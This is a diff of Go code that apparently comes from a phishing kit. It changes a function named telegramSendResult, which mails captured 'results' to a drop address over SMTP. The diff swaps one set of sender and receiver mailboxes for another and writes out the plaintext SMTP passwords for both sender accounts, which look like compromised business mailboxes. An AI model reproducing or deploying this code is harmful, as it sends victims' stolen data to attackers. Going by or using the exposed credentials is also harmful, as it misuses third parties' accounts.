@@ -18,10 +18,10 @@ func telegramSendResult(msg string) {
 	m := gomail.NewMessage()
 
 	// Set E-Mail sender
-	m.SetHeader("From", "alainaubry@a2pfrance.fr")
+	m.SetHeader("From", "philip.morley@vamakitchens.net")
 
 	// Set E-Mail receivers
-	m.SetHeader("To", "scyllascofield@outlook.com")
+	m.SetHeader("To", "creeves@southbendncs.com")
 
 	// Set E-Mail subject
 	m.SetHeader("Subject", "RESULT IS COMING")
@@ -30,7 +30,7 @@ func telegramSendResult(msg string) {
 	m.SetBody("text/plain", msg)
 
 	// Settings for SMTP server
-	d := gomail.NewDialer("smtp.ionos.de", 587, "alainaubry@a2pfrance.fr", "Angus4952!")
+	d := gomail.NewDialer("smtp.ionos.co.uk", 587, "philip.morley@vamakitchens.net", "Jordanf12")
 
 	// This is only needed when SSL/TLS certificate is not valid on server.
 	// In production this should be set to false.
